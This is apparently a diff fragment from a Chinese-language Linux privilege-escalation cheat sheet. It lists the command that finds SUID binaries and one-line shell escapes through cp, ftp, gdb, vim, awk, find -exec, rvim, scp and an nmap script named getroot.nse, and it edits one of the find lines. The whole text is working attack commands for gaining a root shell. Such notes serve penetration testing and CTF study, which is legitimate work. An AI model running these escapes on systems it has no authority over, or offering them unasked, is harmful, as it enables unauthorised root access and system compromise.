@@ -71,7 +71,7 @@ find / -perm -u=s -type f 2>/dev/null
 "cp"命令可将/bin/sh或/bin/bash复制到当前目录
 ftp,gdb,vim,more/man/less中可运行!/bin/sh或!/bin/bash
 awk 'BEGIN {system("/bin/sh或/bin/bash")}'
-find / -name test -exec /bin/sh或/bin/bash -p \;
+find . -exec /bin/sh或/bin/bash -p \;
 rvim中执行:python import os; os.system("/bin/bash")
 scp -S /path/yourscript x y:
 + echo 'os.execute("/bin/sh")' > getroot.nse
